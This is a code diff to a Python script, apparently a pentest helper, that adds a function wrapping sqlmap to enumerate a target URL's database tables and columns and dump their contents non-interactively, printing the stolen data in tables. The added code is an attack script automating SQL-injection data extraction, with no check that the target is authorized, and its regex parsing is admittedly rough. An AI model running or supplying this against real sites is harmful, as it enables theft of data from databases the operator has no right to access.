@@ -1,3 +1,4 @@
+import re
 import requests
 import subprocess
 from bs4 import BeautifulSoup
@@ -158,3 +159,75 @@ def display_sqlmap_description():
     """
 
     print(sqlmap_description)
+
+
+# SQLMAP DUMP :
+def sqlmap_dump(url, database):
+    tables = get_database_tables(url, database)
+    if not tables:
+        print("\033[91mNo tables found or unable to retrieve tables.\033[0m")
+        return
+
+    tables_data = {}
+    for table in tables:
+        print(f"\033[92mDumping table: {table}\033[0m")
+        columns = get_table_columns(url, database, table)
+        if not columns:
+            print(f"\033[91mNo columns found for table {table}.\033[0m")
+            continue
+        tables_data[table] = dump_table_data(url, database, table, columns)
+
+    print_results(tables_data)
+
+
+def execute_sqlmap_command(command):
+    try:
+        process = subprocess.Popen(
+            command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
+        stdout, stderr = process.communicate()
+        if stderr:
+            print("Error:", stderr)
+        return stdout
+    except Exception as e:
+        print("Error executing SQLMap command:", e)
+        return None
+
+
+def get_database_tables(url, database):
+    command = ["sqlmap", "-u", url, "-D", database, "--tables", "--batch"]
+    output = execute_sqlmap_command(command)
+    # Ici, vous devrez affiner le regex ou la méthode de parsing selon la sortie exacte de SQLMap
+    tables = re.findall(r'\|\s+(\w+)\s+\|', output)
+    return tables if tables else None
+
+
+def get_table_columns(url, database, table):
+    command = ["sqlmap", "-u", url, "-D", database,
+               "-T", table, "--columns", "--batch"]
+    output = execute_sqlmap_command(command)
+    # Encore une fois, affinez le regex ou la méthode de parsing en fonction de votre sortie
+    columns = re.findall(r'\|\s+(\w+)\s+\|', output)
+    return columns if columns else None
+
+
+def dump_table_data(url, database, table, columns):
+    all_data = []
+    for column in columns:
+        command = ["sqlmap", "-u", url, "-D", database,
+                   "-T", table, "-C", column, "--dump", "--batch"]
+        output = execute_sqlmap_command(command)
+        # Extraction des données (cet exemple suppose que SQLMap affiche les données dans un format clair)
+        data = re.findall(r'\|\s+(\w+)\s+\|', output)
+        all_data.append((column, data))
+    return all_data
+
+
+def print_results(tables_data):
+    for table, data in tables_data.items():
+        print(f"\n\033[1;34m-- {table} --\033[0m")
+        pt = PrettyTable()
+        pt.field_names = ["Column Name", "Data"]
+        for column, rows in data:
+            for row in rows:
+                pt.add_row([column, row])
+        print(pt)
